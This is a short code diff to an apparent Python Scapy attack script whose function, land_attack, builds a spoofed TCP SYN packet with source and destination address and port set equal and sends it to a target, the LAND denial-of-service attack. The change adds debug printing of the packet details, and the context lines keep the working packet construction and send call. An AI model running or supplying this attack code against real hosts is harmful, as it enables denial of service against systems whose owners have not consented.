@@ -15,6 +15,13 @@ def land_attack(target_ip, target_port, source_ip=None):
     # SYN packet where source IP and port are the same as destination IP and port
     pkt = IP(src=source_ip, dst=target_ip) / TCP(sport=target_port, dport=target_port, flags="S")
 
+    print(f"[*] --- LAND Attack Debug ---")
+    print(f"[*] Target IP: {target_ip}, Target Port: {target_port}")
+    print(f"[*] Source IP (spoofed): {source_ip}, Source Port (spoofed): {target_port}")
+    print(f"[*] Scapy packet details:")
+    pkt.show() # Show detailed packet info
+    print(f"[*] --- End LAND Attack Debug ---")
+
     print(f"[*] Sending LAND packet: {source_ip}:{target_port} -> {target_ip}:{target_port}")
     send(pkt, verbose=False)
     print("[+] LAND packet sent.")
